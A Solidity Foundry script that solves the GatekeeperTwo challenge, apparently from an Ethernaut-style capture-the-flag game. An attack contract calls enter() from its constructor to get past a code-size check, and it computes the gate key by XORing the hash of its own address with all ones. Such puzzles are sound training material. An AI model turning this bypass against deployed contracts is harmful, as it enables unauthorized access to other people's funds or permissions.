// SPDX-License-Identifier: MIT
pragma solidity >=0.8.10;

import "forge-std/Script.sol";
import "../src/GatekeeperTwo.sol";

contract GatekeeperTwoHack is Script {
    GatekeeperTwo public gatekeeper;

    function run() public {
        gatekeeper = new GatekeeperTwo();

        vm.startPrank(tx.origin);
        new GatekeeperTwoAttack(address(gatekeeper));
        vm.stopPrank();

        console.log(gatekeeper.entrant());
    }
}

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperTwoAttack {
    IGatekeeperTwo public target;
    uint64 gatekey;

    constructor(address _target) {
        target = IGatekeeperTwo(_target);

        unchecked {
            gatekey =
                uint64(bytes8(keccak256(abi.encodePacked(this)))) ^
                (uint64(0) - 1);
        }

        target.enter(bytes8(gatekey));
    }
}
